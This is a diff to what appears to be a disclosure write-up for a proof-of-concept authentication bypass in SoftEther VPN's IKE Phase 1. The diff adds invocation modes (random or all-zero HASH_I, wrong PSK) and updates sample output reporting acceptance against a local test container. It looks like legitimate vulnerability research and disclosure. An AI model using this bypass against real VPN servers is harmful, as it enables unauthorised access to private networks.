@@ -880,11 +880,17 @@ docker run --rm --network host -e SE_PSK=secret ike-test-softether
 ```
 
 ```bash
-# Bogus HASH_I — correct PSK used for encryption keys (ACCEPTED by SoftEther)
+# Bogus HASH_I (all zeros) — correct PSK used for encryption keys (ACCEPTED)
 python poc_softether_hash_i.py
 
-# Bogus HASH_I — entirely wrong PSK for all key material (still ACCEPTED)
+# Bogus HASH_I (all zeros) — entirely wrong PSK for all key material (still ACCEPTED)
 python poc_softether_hash_i.py --wrong-psk
+
+# Bogus HASH_I (random bytes) — rules out special-casing of the zero value (still ACCEPTED)
+python poc_softether_hash_i.py --random-hash
+
+# Combine: random HASH_I and wrong PSK — maximum divergence from a valid exchange
+python poc_softether_hash_i.py --random-hash --wrong-psk
 
 # Compare against strongSwan on a second host (strongSwan rejects)
 python poc_softether_hash_i.py --compare <strongswan-host>
@@ -901,17 +907,17 @@ python poc_softether_hash_i.py --compare <strongswan-host>
   PSK in use  : 'definitely_not_the_psk_xyzzy_12345'
   HASH_I sent : <all zeros — 20 bytes of 0x00>
 
-  NOTE: --wrong-psk mode — even the encryption keys are derived
-  from the wrong PSK. SoftEther still cannot tell the difference.
+  NOTE: --random-hash mode — HASH_I is freshly randomised each run,
+  ruling out any special-case handling of the all-zero value.
 
 ======================================================================
   RESULT — SoftEther (127.0.0.1)
 ======================================================================
-  [VULNERABLE] Phase 1 ACCEPTED with all-zero HASH_I
+  [VULNERABLE] Phase 1 ACCEPTED with random bytes HASH_I
 
     host     : 127.0.0.1
-    PSK used : 'definitely_not_the_psk_xyzzy_12345'
-    HASH_I   : 0000000000000000000000000000000000000000 (all zeros)
+    PSK used : 'secret'
+    HASH_I   : f105771ae89204308eeae1265cdbd187134ecd02 (random bytes)
 
   The responder never verified the initiator's identity.
   An attacker with no knowledge of the PSK can establish
